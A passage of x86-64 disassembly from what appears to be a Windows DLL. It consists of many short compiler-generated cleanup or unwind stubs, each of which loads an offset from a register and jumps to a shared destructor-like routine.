jmp sub_180020254
sub_180034900
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_18000c860
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
mov rcx [ rdx + 0x50 ]
jmp sub_18001fa20
sub_180034930
mov rcx [ rdx + 0x50 ]
add rcx 0x8
jmp sub_18000bda0
sub_180034940
mov rcx [ rdx + 0x50 ]
add rcx 0x18
jmp sub_18000bda0
sub_180034950
mov rcx [ rdx + 0x50 ]
add rcx 0x28
jmp sub_18000bda0
sub_180034960
mov rcx [ rdx + 0x50 ]
add rcx 0x38
jmp sub_18000bda0
sub_180034970
mov rcx [ rdx + 0x40 ]
jmp sub_18001fa20
sub_180034980
mov rcx [ rdx + 0x40 ]
add rcx 0x8
jmp sub_18000bda0
sub_180034990
mov rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_18000bda0
sub_1800349a0
mov rcx [ rdx + 0x40 ]
add rcx 0x28
jmp sub_18000bda0
sub_1800349b0
mov rcx [ rdx + 0x40 ]
add rcx 0x38
jmp sub_18000bda0
sub_1800349c0
mov rcx [ rdx + 0xa0 ]
jmp j_sub_18002094c#2
sub_1800349d0
mov rcx [ rdx + 0x40 ]
sub rcx 0x98
add rcx 0x18
jmp sub_18000b860
sub_1800349f0
lea rcx [ rdx + 0x68 ]
jmp sub_18001fa20
sub_180034a00
mov rcx [ rdx + 0x80 ]
jmp j_sub_18002094c#2
sub_180034a10
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180034a30
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x20 ]
call j_sub_18002094c#2
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
lea rcx [ rdx + 0x68 ]
jmp sub_18000b6f0
sub_180034a60
mov rcx [ rdx + 0xa0 ]
jmp j_sub_18002094c#2
sub_180034aa0
mov rcx [ rdx + 0xa0 ]
jmp sub_18000b6e0
sub_180034ab0
mov rcx [ rdx + 0x40 ]
jmp sub_18000b8a0
sub_180034bb0
lea rcx [ rdx + 0x50 ]
jmp sub_18000b8a0
sub_180034bc0
lea rcx [ rdx + 0x30 ]
jmp sub_1800034f0
sub_180034bd0
lea rcx [ rdx + 0x30 ]
jmp sub_1800034f0
sub_180034be0
lea rcx [ rdx + 0x30 ]
jmp sub_1800034f0
sub_180034bf0
lea rcx [ rdx + 0x30 ]
jmp sub_18000b6f0
sub_180034c00
lea rcx [ rdx + 0x68 ]
jmp sub_1800034f0
sub_180034c10
lea rcx [ rdx + 0x90 ]
jmp sub_1800034f0
sub_180034c20
lea rcx [ rdx + 0x90 ]
jmp sub_1800034f0
sub_180034c30
lea rcx [ rdx + 0xa8 ]
jmp sub_18000b6f0
sub_180034c40
lea rcx [ rdx + 0xe8 ]
jmp sub_1800034f0
sub_180034c50
lea rcx [ rdx + 0xc0 ]
jmp sub_1800034f0
sub_180034c60
lea rcx [ rdx + 0x70 ]
jmp sub_18000b6f0
sub_180034c70
lea rcx [ rdx + 0x98 ]
jmp sub_1800034f0
sub_180034cb0
mov rcx [ rdx + 0x30 ]
jmp j_sub_18002094c#2
sub_180034cc0
lea rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180034cd0
lea rcx [ rdx + 0x78 ]
jmp sub_1800034f0
sub_180034ce0
lea rcx [ rdx + 0x50 ]
jmp sub_1800034f0
sub_180034cf0
lea rcx [ rdx + 0x78 ]
jmp sub_1800034f0
sub_180034d00
lea rcx [ rdx + 0x50 ]
jmp sub_1800034f0
sub_180034d10
lea rcx [ rdx + 0xc0 ]
jmp sub_1800034f0
sub_180034d20
mov rcx [ rdx + 0x38 ]
jmp j_sub_18002094c#2
sub_180034d30
lea rcx [ rdx + 0x70 ]
jmp sub_180001820
sub_180034d40
lea rcx [ rdx + 0x110 ]
jmp sub_1800034f0
sub_180034d50
lea rcx [ rdx + 0xe8 ]
jmp sub_180001820
sub_180034d60
lea rcx [ rdx + 0x138 ]
jmp sub_1800034f0
sub_180034d70
lea rcx [ rdx + 0x98 ]
jmp sub_1800034f0
sub_180034d80
mov rcx [ rdx + 0x38 ]
jmp sub_1800034f0
sub_180034d90
mov rcx [ rdx + 0x38 ]
jmp sub_1800034f0
sub_180034da0
mov rcx [ rdx + 0x38 ]
jmp sub_1800034f0
sub_180034db0
mov rcx [ rdx + 0x48 ]
jmp j_sub_18002094c#2
sub_180034dc0
lea rcx [ rdx + 0x30 ]
jmp sub_180018390
sub_180034dd0
lea rcx [ rdx + 0x1c8 ]
jmp sub_1800034f0
sub_180034e10
lea rcx [ rdx + 0xb0 ]
add rcx 0x10
jmp sub_18000b840
sub_180034e20
lea rcx [ rdx + 0xb0 ]
add rcx 0x18
jmp sub_18000b860
sub_180034e30
mov rcx [ rdx + 0x498 ]
jmp sub_18000bdd0
sub_180034e40
lea rcx [ rdx + 0xb0 ]
jmp sub_18000d6c0
sub_180034e50
lea rcx [ rdx + 0x420 ]
jmp sub_1800034f0
sub_180034e60
lea rcx [ rdx + 0x3d0 ]
jmp sub_1800034f0
sub_180034e70
lea rcx [ rdx + 0x380 ]
jmp sub_1800034f0
sub_180034e80
lea rcx [ rdx + 0x2b8 ]
jmp sub_1800034f0
sub_180034e90
lea rcx [ rdx + 0x268 ]
jmp sub_1800034f0
sub_180034ea0
lea rcx [ rdx + 0x308 ]
jmp sub_1800034f0
sub_180034eb0
lea rcx [ rdx + 0x3a8 ]
jmp sub_1800034f0
sub_180034ec0
lea rcx [ rdx + 0x358 ]
jmp sub_1800034f0
sub_180034ed0
lea rcx [ rdx + 0x448 ]
jmp sub_1800034f0
sub_180034ee0
lea rcx [ rdx + 0x1f0 ]
jmp sub_1800034f0
sub_180034ef0
lea rcx [ rdx + 0x240 ]
jmp sub_1800034f0
sub_180034f00
lea rcx [ rdx + 0x218 ]
jmp sub_1800034f0
sub_180034f10
lea rcx [ rdx + 0x290 ]
jmp sub_1800034f0
sub_180034f20
lea rcx [ rdx + 0x3f8 ]
jmp sub_1800034f0
sub_180034f30
lea rcx [ rdx + 0x2e0 ]
jmp sub_1800034f0
sub_180034f40
lea rcx [ rdx + 0x470 ]
jmp sub_1800034f0
sub_180034f50
lea rcx [ rdx + 0x330 ]
jmp sub_1800034f0
sub_180034f70
mov rcx [ rdx + 0x40 ]
add rcx 0x10
jmp sub_18000af90
sub_180034f80
mov rcx [ rdx + 0x40 ]
add rcx 0x58
jmp sub_18000e260
sub_180034f90
mov rcx [ rdx + 0x40 ]
add rcx 0x70
jmp sub_180008f70
sub_180034fa0
mov rcx [ rdx + 0x48 ]
jmp sub_180007880
sub_180034fb0
mov rcx [ rdx + 0xc8 ]
jmp j_sub_18002094c#2
sub_180034fc0
lea rcx [ rdx + 0x98 ]
jmp sub_1800034f0
sub_180034fd0
lea rcx [ rdx + 0x98 ]
jmp sub_1800034f0
sub_180034ff0
mov rcx [ rdx + 0x40 ]
add rcx 0x10
jmp sub_18000af90
sub_180035000
mov rcx [ rdx + 0x40 ]
add rcx 0x58
jmp sub_18000e260
sub_180035010
mov rcx [ rdx + 0x40 ]
add rcx 0x70
jmp sub_180008f70
sub_180035020
mov rcx [ rdx + 0x40 ]
add rcx 0xa0
jmp sub_180020254
sub_180035040
mov rcx [ rdx + 0x38 ]
jmp j_sub_18002094c#2
sub_180035050
mov rcx [ rdx + 0x48 ]
jmp j_sub_18002094c#2
sub_180035090
mov rcx [ rdx + 0x98 ]
jmp j_sub_18002094c#2
sub_1800350a0
lea rcx [ rdx + 0xf0 ]
jmp sub_180001820
sub_1800350b0
lea rcx [ rdx + 0xf0 ]
jmp sub_180001820
sub_1800350c0
lea rcx [ rdx + 0x168 ]
jmp sub_180001820
sub_1800350d0
lea rcx [ rdx + 0x140 ]
jmp sub_1800034f0
sub_1800350e0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x30 ]
mov rcx [ rbp + 0x38 ]
call sub_18000be70
add rsp 0x20
pop rbp
retn
sub_180035130
mov rcx [ rdx + 0x30 ]
add rcx 0x40
jmp sub_180012d60
sub_180035140
mov rcx [ rdx + 0x20 ]
jmp j_sub_18002094c#2
sub_180035150
lea rcx [ rdx + 0x68 ]
jmp sub_1800034f0
sub_180035160
lea rcx [ rdx + 0x38 ]
jmp sub_180012000
sub_180035170
lea rcx [ rdx + 0x30 ]
jmp sub_180001820
sub_180035180
lea rcx [ rdx + 0x58 ]
jmp sub_1800034f0
sub_180035190
lea rcx [ rdx + 0x80 ]
jmp sub_180012000
sub_1800351a0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x28 ]
call sub_180020498
nop
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_1800351e0
mov rcx [ rdx + 0x40 ]
add rcx 0x38
jmp sub_1800135f0
sub_1800351f0
mov rcx [ rdx + 0x40 ]
add rcx 0x68
jmp sub_1800135f0
sub_180035210
mov rcx [ rdx + 0x40 ]
add rcx 0x38
jmp sub_1800135f0
sub_180035220
mov rcx [ rdx + 0x40 ]
add rcx 0x68
jmp sub_1800135f0
sub_180035230
mov rcx [ rdx + 0x48 ]
jmp j_sub_18002094c#2
sub_180035240
mov rcx [ rdx + 0x88 ]
jmp sub_180018390
sub_180035250
mov rcx [ rdx + 0x90 ]
jmp j_sub_18002094c#2
sub_180035260
mov rcx [ rdx + 0x90 ]
jmp j_sub_18002094c#2
sub_180035270
mov rcx [ rdx + 0x98 ]
jmp j_sub_18002094c#2
sub_180035280
mov rcx [ rdx + 0x90 ]
jmp j_sub_18002094c#2
sub_180035290
mov rcx [ rdx + 0x90 ]
jmp j_sub_18002094c#2
sub_1800352a0
mov rcx [ rdx + 0x90 ]
jmp j_sub_18002094c#2
sub_1800352b0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov rdx [ rbp + 0x38 ]
lea rcx [ rbp + 0x58 ]
call sub_180020510
lea rdx [ r--data ]
lea rcx [ rbp + 0x58 ]
call sub_1800210a4
nop
int3
sub_1800354a0
lea rcx [ rdx + 0x60 ]
jmp sub_1800034f0
sub_1800354b0
lea rcx [ rdx + 0x38 ]
jmp sub_1800034f0
sub_1800354c0
lea rcx [ rdx + 0xb0 ]
jmp sub_1800034f0
sub_1800354d0
mov rcx [ rdx + 0x28 ]
jmp j_sub_18002094c#2
sub_1800354e0
mov rcx [ rdx + 0x58 ]
jmp sub_1800034f0
sub_1800354f0
mov rcx [ rdx + 0x30 ]
jmp j_sub_18002094c#2
sub_180035500
lea rcx [ rdx + 0x128 ]
jmp sub_1800034f0
sub_180035540
lea rcx [ rdx + 0xb0 ]
jmp sub_1800034f0
sub_180035550
lea rcx [ rdx + 0x60 ]
jmp sub_1800034f0
sub_180035560
lea rcx [ rdx + 0x100 ]
jmp sub_1800034f0
sub_180035570
lea rcx [ rdx + 0x88 ]
jmp sub_1800034f0
sub_180035580
lea rcx [ rdx + 0x100 ]
jmp sub_1800034f0
sub_180035590
lea rcx [ rdx + 0xd8 ]
jmp sub_1800034f0
sub_1800355a0
lea rcx [ rdx + 0x88 ]
jmp sub_1800034f0
sub_1800355b0
lea rcx [ rdx + 0x150 ]
jmp sub_1800034f0
sub_1800355c0
lea rcx [ rdx + 0x60 ]
jmp sub_1800034f0
sub_1800355d0
lea rcx [ rdx + 0xd8 ]
jmp sub_1800034f0
sub_1800355e0
lea rcx [ rdx + 0x100 ]
jmp sub_1800034f0
sub_1800355f0
lea rcx [ rdx + 0x150 ]
jmp sub_1800034f0
sub_180035600
lea rcx [ rdx + 0x88 ]
jmp sub_1800034f0
sub_180035640
lea rcx [ rdx + 0x60 ]
jmp sub_1800034f0
sub_180035650
lea rcx [ rdx + 0x38 ]
jmp sub_1800034f0
sub_180035660
lea rcx [ rdx + 0x58 ]
jmp sub_1800034f0
sub_180035670
mov rcx [ rdx + 0x98 ]
jmp sub_180018390
sub_180035680
lea rcx [ rdx + 0xa0 ]
jmp sub_1800034f0
sub_1800356a0
lea rcx [ rdx + 0x68 ]
jmp sub_1800034f0
sub_1800356d0
mov rcx [ rdx + 0x48 ]
jmp j_sub_18002094c#2
sub_1800356e0
lea rcx [ rdx + 0x58 ]
jmp sub_180001820
sub_1800356f0
mov rcx [ rdx + 0x40 ]
jmp sub_180016c60
sub_180035700
mov rcx [ rdx + 0x40 ]
add rcx 0x40
jmp sub_180001820
sub_180035710
lea rcx [ rdx + 0x30 ]
jmp sub_180001820
sub_180035720
lea rcx [ rdx + 0x30 ]
jmp sub_1800034f0
sub_180035730
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x48 ]
call j_sub_18002094c#2
xor edx edx
xor ecx ecx
call sub_1800210a4
nop
mov rcx [ rdx + 0x38 ]
jmp sub_180001820
sub_180035760
mov rcx [ rdx + 0x30 ]
jmp sub_1800034f0
sub_180035770
mov rcx [ rdx + 0x20 ]
add rcx 0x10
jmp sub_1800034f0
sub_180035780
mov rcx [ rdx + 0x40 ]
add rcx 0x10
jmp sub_180001820
sub_180035790
mov rcx [ rdx + 0x68 ]
jmp sub_180001820
sub_1800357a0
lea rcx [ rdx + 0x48 ]
jmp sub_180018390
sub_1800357e0
mov rcx [ rdx + 0xd8 ]
jmp sub_180001820
sub_1800357f0
mov rcx [ rdx + 0xe0 ]
jmp sub_180001820
sub_180035800
lea rcx [ rdx + 0x110 ]
jmp sub_180001820
sub_180035810
lea rcx [ rdx + 0x138 ]
jmp sub_180001820
sub_180035820
lea rcx [ rdx + 0xe8 ]
jmp sub_180001820
sub_180035830
mov rcx [ rdx + 0x40 ]
jmp j_sub_18002094c#2
sub_180035840
mov rcx [ rdx + 0x78 ]
jmp sub_180001820
sub_180035850
mov rcx [ rdx + 0x80 ]
jmp sub_180001820
sub_180035860
mov rcx [ rdx + 0x88 ]
jmp sub_180001820
sub_180035870
lea rcx [ rdx + 0x6a0 ]
jmp sub_180001820
sub_180035880
lea rcx [ rdx + 0x3f8 ]
jmp sub_180001820
sub_180035890
mov rcx [ rdx + 0x40 ]
jmp j_sub_18002094c#2
sub_1800358a0
lea rcx [ rdx + 0x830 ]
jmp sub_180001820
sub_1800358b0
lea rcx [ rdx + 0x560 ]
jmp sub_180001820
sub_1800358c0
lea rcx [ rdx + 0x858 ]
jmp sub_180001820
sub_1800358d0
lea rcx [ rdx + 0x808 ]
jmp sub_180001820
sub_1800358e0
lea rcx [ rdx + 0x880 ]
jmp sub_180001820
sub_1800358f0
lea rcx [ rdx + 0x8b8 ]
jmp sub_180001820
sub_180035900
lea rcx [ rdx + 0x7b8 ]
jmp sub_180001820
sub_180035910
lea rcx [ rdx + 0x2e0 ]
jmp sub_180001820
sub_180035920
lea rcx [ rdx + 0x380 ]
jmp sub_180001820
sub_180035930
lea rcx [ rdx + 0x420 ]
jmp sub_180001820
sub_180035940
lea rcx [ rdx + 0x358 ]
jmp sub_180001820
sub_180035950
lea rcx [ rdx + 0x498 ]
jmp sub_180001820
sub_180035960
lea rcx [ rdx + 0x330 ]
jmp sub_180001820
sub_180035970
lea rcx [ rdx + 0x4c0 ]
jmp sub_180001820
sub_180035980
lea rcx [ rdx + 0x3d0 ]
jmp sub_180001820
sub_180035990
lea rcx [ rdx + 0x470 ]
jmp sub_180001820
sub_1800359a0
lea rcx [ rdx + 0x448 ]
jmp sub_180001820
sub_1800359b0
lea rcx [ rdx + 0x4e8 ]
jmp sub_180001820
sub_1800359c0
lea rcx [ rdx + 0x538 ]
jmp sub_180001820
sub_1800359d0
lea rcx [ rdx + 0x600 ]
jmp sub_180001820
sub_1800359e0
lea rcx [ rdx + 0x5d8 ]
jmp sub_180001820
sub_1800359f0
lea rcx [ rdx + 0x650 ]
jmp sub_180001820
sub_180035a00
lea rcx [ rdx + 0x678 ]
jmp sub_180001820
sub_180035a10
lea rcx [ rdx + 0x6f0 ]
jmp sub_180001820
sub_180035a20
lea rcx [ rdx + 0x740 ]
jmp sub_180001820
sub_180035a30
lea rcx [ rdx + 0x6c8 ]
jmp sub_180001820
sub_180035a40
lea rcx [ rdx + 0x768 ]
jmp sub_180001820
sub_180035a50
lea rcx [ rdx + 0x718 ]
jmp sub_180001820
sub_180035a60
lea rcx [ rdx + 0x628 ]
jmp sub_180001820
sub_180035a70
lea rcx [ rdx + 0x5b0 ]
jmp sub_180001820
sub_180035a80
lea rcx [ rdx + 0x790 ]
jmp sub_180001820
sub_180035a90
lea rcx [ rdx + 0x7e0 ]
jmp sub_180001820
sub_180035aa0
lea rcx [ rdx + 0x588 ]
jmp sub_180001820
sub_180035ab0
lea rcx [ rdx + 0x308 ]
jmp sub_180001820
sub_180035ac0
mov rcx [ rdx + 0x40 ]
jmp sub_180001820
sub_180035ad0
lea rcx [ rdx + 0x790 ]
jmp sub_180001820
sub_180035ae0
lea rcx [ rdx + 0x2e0 ]
jmp sub_180001820
sub_180035af0
lea rcx [ rdx + 0x628 ]
jmp sub_180001820
sub_180035b00
lea rcx [ rdx + 0x718 ]
jmp sub_180001820
sub_180035b10
lea rcx [ rdx + 0x308 ]
jmp sub_180001820
sub_180035b20
lea rcx [ rdx + 0x5b0 ]
jmp sub_180001820
sub_180035b30
lea rcx [ rdx + 0x3d0 ]
jmp sub_180001820
sub_180035b40
lea rcx [ rdx + 0x678 ]
jmp sub_180001820
sub_180035b50
lea rcx [ rdx + 0x650 ]
jmp sub_180001820
sub_180035b60
lea rcx [ rdx + 0x510 ]
jmp sub_180001820
sub_180035b70
lea rcx [ rdx + 0x448 ]
jmp sub_180001820
sub_180035b80
lea rcx [ rdx + 0x740 ]
jmp sub_180001820
sub_180035b90
lea rcx [ rdx + 0x6f0 ]
jmp sub_180001820
sub_180035ba0
lea rcx [ rdx + 0x588 ]
jmp sub_180001820
sub_180035bb0
lea rcx [ rdx + 0x6c8 ]
jmp sub_180001820
sub_180035bc0
lea rcx [ rdx + 0x380 ]
jmp sub_180001820
sub_180035bd0
lea rcx [ rdx + 0x498 ]
jmp sub_180001820
sub_180035be0
lea rcx [ rdx + 0x420 ]
jmp sub_180001820
sub_180035bf0
mov rcx [ rdx + 0x40 ]
jmp j_sub_18002094c#2
sub_180035c00
lea rcx [ rdx + 0x600 ]
jmp sub_180001820
sub_180035c10
lea rcx [ rdx + 0x358 ]
jmp sub_180001820
sub_180035c20
lea rcx [ rdx + 0x538 ]
jmp sub_180001820
sub_180035c30
lea rcx [ rdx + 0x4e8 ]
jmp sub_180001820
sub_180035c40
lea rcx [ rdx + 0x330 ]
jmp sub_180001820
sub_180035c50
lea rcx [ rdx + 0x5d8 ]
jmp sub_180001820
sub_180035c60
lea rcx [ rdx + 0x308 ]
jmp sub_180001820
sub_180035c70
lea rcx [ rdx + 0x420 ]
jmp sub_180001820
sub_180035c80
lea rcx [ rdx + 0x308 ]
jmp sub_180001820
sub_180035c90
lea rcx [ rdx + 0x3d0 ]
jmp sub_180001820
sub_180035ca0
lea rcx [ rdx + 0x3a8 ]
jmp sub_180001820
sub_180035cb0
lea rcx [ rdx + 0x330 ]
jmp sub_180001820
sub_180035cc0
lea rcx [ rdx + 0x510 ]
jmp sub_180001820
sub_180035cd0
lea rcx [ rdx + 0x358 ]
jmp sub_180001820
sub_180035ce0
lea rcx [ rdx + 0x448 ]
jmp sub_180001820
sub_180035cf0
lea rcx [ rdx + 0x380 ]
jmp sub_180001820
sub_180035d00
lea rcx [ rdx + 0x588 ]
jmp sub_180001820
sub_180035d10
lea rcx [ rdx + 0x2e0 ]
jmp sub_180001820
sub_180035d20
lea rcx [ rdx + 0x7e0 ]
jmp sub_180001820
sub_180035d30
lea rcx [ rdx + 0x790 ]
jmp sub_180001820
sub_180035d40
lea rcx [ rdx + 0x5b0 ]
jmp sub_180001820
sub_180035d50
lea rcx [ rdx + 0x628 ]
jmp sub_180001820
sub_180035d60
lea rcx [ rdx + 0x718 ]
jmp sub_180001820
sub_180035d70
lea rcx [ rdx + 0x768 ]
jmp sub_180001820
sub_180035d80
lea rcx [ rdx + 0x6c8 ]
jmp sub_180001820
sub_180035d90
lea rcx [ rdx + 0x740 ]
jmp sub_180001820
sub_180035da0
lea rcx [ rdx + 0x6f0 ]
jmp sub_180001820
sub_180035db0
lea rcx [ rdx + 0x678 ]
jmp sub_180001820
sub_180035dc0
lea rcx [ rdx + 0x650 ]
jmp sub_180001820
sub_180035dd0
lea rcx [ rdx + 0x5d8 ]
jmp sub_180001820
sub_180035de0
lea rcx [ rdx + 0x600 ]
jmp sub_180001820
sub_180035df0
lea rcx [ rdx + 0x538 ]
jmp sub_180001820
sub_180035e00
lea rcx [ rdx + 0x4e8 ]
jmp sub_180001820
sub_180035e10
lea rcx [ rdx + 0x470 ]
jmp sub_180001820
sub_180035e20
lea rcx [ rdx + 0x4c0 ]
jmp sub_180001820
sub_180035e30
lea rcx [ rdx + 0x498 ]
jmp sub_180001820
sub_180035e40
lea rcx [ rdx + 0x420 ]
jmp sub_180001820
sub_180035e50
lea rcx [ rdx + 0x538 ]
jmp sub_180001820
sub_180035e60
lea rcx [ rdx + 0x2e0 ]
jmp sub_180001820
sub_180035e70
lea rcx [ rdx + 0x4e8 ]
jmp sub_180001820
sub_180035e80
lea rcx [ rdx + 0x470 ]
jmp sub_180001820
sub_180035e90
lea rcx [ rdx + 0x4c0 ]
jmp sub_180001820
sub_180035ea0
lea rcx [ rdx + 0x498 ]
jmp sub_180001820
sub_180035eb0
lea rcx [ rdx + 0x420 ]
jmp sub_180001820
sub_180035ec0
lea rcx [ rdx + 0x510 ]
jmp sub_180001820
sub_180035ed0
lea rcx [ rdx + 0x3a8 ]
jmp sub_180001820
sub_180035ee0
lea rcx [ rdx + 0x308 ]
jmp sub_180001820
sub_180035ef0
lea rcx [ rdx + 0x3a8 ]
jmp sub_180001820
sub_180035f00
lea rcx [ rdx + 0x308 ]
jmp sub_180001820
sub_180035f10
lea rcx [ rdx + 0x2e0 ]
jmp sub_180001820
sub_180035f20
lea rcx [ rdx + 0x510 ]
jmp sub_180001820
sub_180035f30
lea rcx [ rdx + 0x3a8 ]
jmp sub_180001820
sub_180035f40
lea rcx [ rdx + 0x308 ]
jmp sub_180001820
sub_180035f50
lea rcx [ rdx + 0x3d0 ]
jmp sub_180001820
sub_180035f60
lea rcx [ rdx + 0x448 ]
jmp sub_180001820
sub_180035f70
lea rcx [ rdx + 0x330 ]
jmp sub_180001820
sub_180035f80
lea rcx [ rdx + 0x588 ]
jmp sub_180001820
sub_180035f90
lea rcx [ rdx + 0x358 ]
jmp sub_180001820
sub_180035fa0
lea rcx [ rdx + 0x7e0 ]
jmp sub_180001820
sub_180035fb0
lea rcx [ rdx + 0x380 ]
jmp sub_180001820
sub_180035fc0
lea rcx [ rdx + 0x790 ]
jmp sub_180001820
sub_180035fd0
lea rcx [ rdx + 0x2e0 ]
jmp sub_180001820
sub_180035fe0
lea rcx [ rdx + 0x5b0 ]
jmp sub_180001820
sub_180035ff0
lea rcx [ rdx + 0x628 ]
jmp sub_180001820
sub_180036000
lea rcx [ rdx + 0x718 ]
jmp sub_180001820
sub_180036010
lea rcx [ rdx + 0x768 ]
jmp sub_180001820
sub_180036020
lea rcx [ rdx + 0x6c8 ]
jmp sub_180001820
sub_180036030
lea rcx [ rdx + 0x740 ]
jmp sub_180001820
sub_180036040
lea rcx [ rdx + 0x6f0 ]
jmp sub_180001820
sub_180036050
lea rcx [ rdx + 0x678 ]
jmp sub_180001820
sub_180036060
lea rcx [ rdx + 0x650 ]
jmp sub_180001820
sub_180036070
lea rcx [ rdx + 0x5d8 ]
jmp sub_180001820
sub_180036080
lea rcx [ rdx + 0x600 ]
jmp sub_180001820
sub_180036090
lea rcx [ rdx + 0x538 ]
jmp sub_180001820
sub_1800360a0
lea rcx [ rdx + 0x4e8 ]
jmp sub_180001820
sub_1800360b0
lea rcx [ rdx + 0x470 ]
jmp sub_180001820
sub_1800360c0
lea rcx [ rdx + 0x4c0 ]
jmp sub_180001820
sub_1800360d0
lea rcx [ rdx + 0x498 ]
jmp sub_180001820
sub_1800360e0
lea rcx [ rdx + 0x420 ]
jmp sub_180001820
sub_1800360f0
lea rcx [ rdx + 0x510 ]
jmp sub_180001820
sub_180036100
lea rcx [ rdx + 0x3a8 ]
jmp sub_180001820
sub_180036110
mov rcx [ rdx + 0x40 ]
jmp sub_180001820
sub_180036120
mov rcx [ rdx + 0x40 ]
jmp j_sub_18002094c#2
sub_180036130
mov rcx [ rdx + 0x50 ]
jmp sub_180018390
sub_180036140
mov rcx [ rdx + 0x58 ]
jmp sub_180001820
sub_180036150
mov rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_180036160
mov rcx [ rdx + 0x78 ]
jmp sub_180018390
sub_180036170
mov rcx [ rdx + 0x80 ]
jmp sub_180018390
sub_1800361b0
mov rcx [ rdx + 0x40 ]
jmp sub_180001820
sub_1800361c0
mov rcx [ rdx + 0x48 ]
jmp sub_180001820
sub_1800361d0
lea rcx [ rdx + 0x50 ]
jmp sub_180001820
sub_1800361e0
lea rcx [ rdx + 0x78 ]
jmp sub_180001820
sub_1800361f0
lea rcx [ rdx + 0x78 ]
jmp sub_180001820
sub_180036200
lea rcx [ rdx + 0x118 ]
jmp sub_180001820
sub_180036210
lea rcx [ rdx + 0x168 ]
jmp sub_180001820
sub_180036220
lea rcx [ rdx + 0x140 ]
jmp sub_180001820
sub_180036230
lea rcx [ rdx + 0x190 ]
jmp sub_180001820
sub_180036240
lea rcx [ rdx + 0xa0 ]
jmp sub_180001820
sub_180036250
mov rcx [ rdx + 0x38 ]
jmp j_sub_18002094c#2
sub_180036260
lea rcx [ rdx + 0x78 ]
jmp sub_180001820
sub_1800362d0
lea rcx [ rdx + 0xf0 ]
jmp sub_180001820
sub_1800362e0
lea rcx [ rdx + 0x78 ]
jmp sub_180001820
sub_1800362f0
lea rcx [ rdx + 0xf0 ]
jmp sub_180001820
sub_180036300
lea rcx [ rdx + 0x78 ]
jmp sub_180001820
sub_180036310
lea rcx [ rdx + 0xf0 ]
jmp sub_180001820
sub_180036320
lea rcx [ rdx + 0xc8 ]
jmp sub_180001820
sub_180036330
lea rcx [ rdx + 0x58 ]
jmp sub_180001820
sub_180036340
mov rcx [ rdx + 0x40 ]
jmp sub_180001820
sub_180036350
lea rcx [ rdx + 0x70 ]
jmp sub_180001820
sub_180036360
lea rcx [ rdx + 0x98 ]
jmp sub_180001820
sub_180036370
mov rcx [ rdx + 0x60 ]
jmp sub_180001820
sub_180036380
lea rcx [ rdx + 0x90 ]
jmp sub_180001820
sub_180036390
lea rcx [ rdx + 0xb8 ]
jmp sub_180001820
sub_1800363a0
mov rcx [ rdx + 0x30 ]
jmp sub_180001820
sub_1800363b0
lea rcx [ rdx + 0x38 ]
jmp sub_180001820
sub_1800363c0
lea rcx [ rdx + 0xb0 ]
jmp sub_180001820
sub_1800363d0
lea rcx [ rdx + 0x60 ]
jmp sub_180001820
sub_1800363e0
lea rcx [ rdx + 0x88 ]
jmp sub_180001820
sub_1800363f0
lea rcx [ rdx + 0x150 ]
jmp sub_180001820
sub_180036400
lea rcx [ rdx + 0x100 ]
jmp sub_180001820
sub_180036410
lea rcx [ rdx + 0x128 ]
jmp sub_180001820
sub_180036420
lea rcx [ rdx + 0xd8 ]
jmp sub_180001820
sub_180036430
mov rcx [ rdx + 0x68 ]
jmp sub_180001820
sub_180036440
mov rcx [ rdx + 0x60 ]
jmp sub_180001820
sub_180036450
mov rcx [ rdx + 0x80 ]
add rcx 0x10
jmp sub_180001820
sub_180036460
mov rcx [ rdx + 0x80 ]
add rcx 0x38
jmp sub_180001820
sub_180036470
mov rcx [ rdx + 0x80 ]
add rcx 0x70
jmp sub_180001820
sub_180036480
mov rcx [ rdx + 0x30 ]
jmp j_sub_18002094c#2
sub_180036490
lea rcx [ rdx + 0x220 ]
jmp sub_180001820
sub_1800364a0
lea rcx [ rdx + 0x1f8 ]
jmp sub_180001820
sub_1800364b0
mov rcx [ rdx + 0x30 ]
jmp sub_180001820
sub_1800364c0
lea rcx [ rdx + 0x180 ]
jmp sub_180001820
sub_1800364d0
lea rcx [ rdx + 0x1a8 ]
jmp sub_180001820
sub_1800364e0
lea rcx [ rdx + 0x1d0 ]
jmp sub_180001820
sub_1800364f0
mov rcx [ rdx + 0x30 ]
jmp sub_180001820
sub_180036500
lea rcx [ rdx + 0x158 ]
jmp sub_180001820
sub_180036510
lea rcx [ rdx + 0x108 ]
jmp sub_180001820
sub_180036520
lea rcx [ rdx + 0xb8 ]
jmp sub_180001820
sub_180036530
lea rcx [ rdx + 0xe0 ]
jmp sub_180001820
sub_180036540
lea rcx [ rdx + 0x130 ]
jmp sub_180001820
sub_180036550
lea rcx [ rdx + 0x108 ]
jmp sub_180001820
sub_180036560
lea rcx [ rdx + 0xb8 ]
jmp sub_180001820
sub_180036570
lea rcx [ rdx + 0x130 ]
jmp sub_180001820
sub_180036580
lea rcx [ rdx + 0xe0 ]
jmp sub_180001820
sub_180036590
lea rcx [ rdx + 0x40 ]
jmp sub_180006980
sub_1800365a0
mov rcx [ rdx + 0x128 ]
jmp j_sub_18002094c#2
sub_1800365b0
mov rcx [ rdx + 0x128 ]
jmp j_sub_18002094c#2
sub_1800365c0
mov rcx [ rdx + 0x128 ]
jmp j_sub_18002094c#2
sub_1800365d0
mov rcx [ rdx + 0x128 ]
jmp j_sub_18002094c#2
sub_1800365e0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x28 ]
call sub_180020498
nop
lea rax [ r-xdata ]
